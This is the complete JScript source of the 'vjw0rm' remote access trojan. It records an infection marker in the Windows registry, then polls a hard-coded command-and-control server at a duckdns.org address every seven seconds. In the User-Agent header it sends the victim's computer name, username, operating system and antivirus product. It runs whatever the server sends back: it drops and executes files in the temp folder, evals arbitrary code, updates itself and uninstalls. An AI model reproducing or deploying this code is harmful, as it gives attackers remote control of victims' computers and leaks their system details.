// Coded by v_B01 | Sliemerez -> Twitter : Sliemerez

var j = ["WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP"];
var g = ["HKCU","HKLM","HKCU\\vjw0rm","\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\","HKLM\\SOFTWARE\\Classes\\","REG_SZ","\\defaulticon\\"];
var y = ["winmgmts:","win32_logicaldisk","Win32_OperatingSystem",'AntiVirusProduct'];

var sh = Cr(0);
var fs = Cr(1);
var spl = "|V|";
var Ch = "\\";
var VN = "vjw0rm" + "_" + Ob(6);
var fu = WScript.ScriptFullName;
var wn = WScript.ScriptName;
var U;
try {
U = sh.RegRead(g[2]);
} catch(err) {
var sv = fu.split("\\");
if (":\\" + sv[1] == ":\\" + wn) {
U = "TRUE";
sh.RegWrite(g[2],U,g[5]);
} else {
U = "FALSE";
sh.RegWrite(g[2],U,g[5]);
}
}

do {
try {
var P = Pt('Vre','');
P = P.split(spl);

if (P[0] === "Cl") {
WScript.Quit(1);
}

if (P[0] === "Sc") {
var s2 = Ex("temp") + "\\" + P[2];
var fi = fs.CreateTextFile(s2,true);
fi.Write(P[1]);
fi.Close();
sh.run(s2);
}

if (P[0] === "Ex") {
eval(P[1]);
}

if (P[0] === "Rn") {
var ri = fs.OpenTextFile(fu,1);
var fr = ri.ReadAll();
ri.Close();
VN = VN.split("_");
fr = fr.replace(VN[0],P[1]);
var wi = fs.OpenTextFile(fu,2,false);
wi.Write(fr);
wi.Close();
sh.run("wscript.exe //B \"" + fu + "\"");
WScript.Quit(1);
}

if (P[0] === "Up") {
var s2 = Ex("temp") + "\\" + P[2];
var ctf = fs.CreateTextFile(s2,true);
var gu = P[1];
gu = gu.replace("|U|","|V|");
ctf.Write(gu);
ctf.Close();
sh.run("wscript.exe //B \"" + s2 + "\"",6);
WScript.Quit(1);
}

if (P[0] === "Un") {
var s2 = P[1];
var vdr = fu;
var regi = "Nothing!";
s2 = s2.replace("%f",fu).replace("%n",wn).replace("%sfdr",vdr).replace("%RgNe%",regi);
eval(s2);
WScript.Quit(1);
}

if (P[0] === "RF") {
var s2 = Ex("temp") + "\\" + P[2];
var fi = fs.CreateTextFile(s2,true);
fi.Write(P[1]);
fi.Close();
sh.run(s2);
}
} catch(err) {
}
WScript.Sleep(7000);

} while (true) ;


function Ex(S) {
return sh.ExpandEnvironmentStrings("%" + S + "%");
}
function Pt(C,A) {
var X = Cr(3);
X.open('POST','http://jswormltd.duckdns.org:1921/' + C, false);
X.SetRequestHeader("User-Agent:",nf());
X.send(A);
return X.responsetext;
}


function nf() {
var s,NT,i;
if (fs.fileexists(Ex("Windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe")) {
NT ="YES";
} else {
NT = "NO";
}
s = VN + Ch + Ex("COMPUTERNAME") + Ch + Ex("USERNAME") + Ch + Ob(2) + Ch + Ob(4) + Ch + Ch + NT + Ch + U + Ch;
return s;
}

function Cr(N) {
	return new ActiveXObject(j[N]);
}

function Ob(N) {
var s;
if (N == 2) {
s = GetObject(y[0]).InstancesOf(y[2]);
var en = new Enumerator(s);
for (; !en.atEnd();en.moveNext()) {
var it = en.item();
return it.Caption;
break;
}
}
if (N == 4) {
var wmg = "winmgmts:\\\\localhost\\root\\securitycenter";
s = GetObject(wmg).InstancesOf(y[3]);
var en = new Enumerator(s);
for (; !en.atEnd();en.moveNext()) {
var it = en.item();
var str = it.DisplayName;
}
if (str !== '') {
wmg = wmg + "2";
s = GetObject(wmg).InstancesOf(y[3]);
en = new Enumerator(s);
for (; !en.atEnd();en.moveNext()) {
it = en.item();
return it.DisplayName;
}
} else {
return it.DisplayName;
}
}
if (N==6) {
s = GetObject(y[0]).InstancesOf(y[1]);
var en = new Enumerator(s);
for (; !en.atEnd();en.moveNext()) {
var it = en.item();
return it.volumeserialnumber;
break;
}
}
}




